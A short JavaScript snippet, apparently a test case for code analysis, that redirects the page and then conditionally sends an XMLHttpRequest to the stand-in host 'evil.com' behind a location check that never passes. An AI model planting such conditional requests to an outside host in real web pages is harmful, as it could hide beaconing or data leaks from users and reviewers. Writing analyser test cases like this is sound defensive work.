var TopString = (45).toString(12);
document.location.href = TopString;

var x = new XMLHttpRequest();
x.open("GET", "http://evil.com");

function foo() {
	if (document.location.href != "hush-hush.com") 
		return;
	x.send(null);	
}

foo();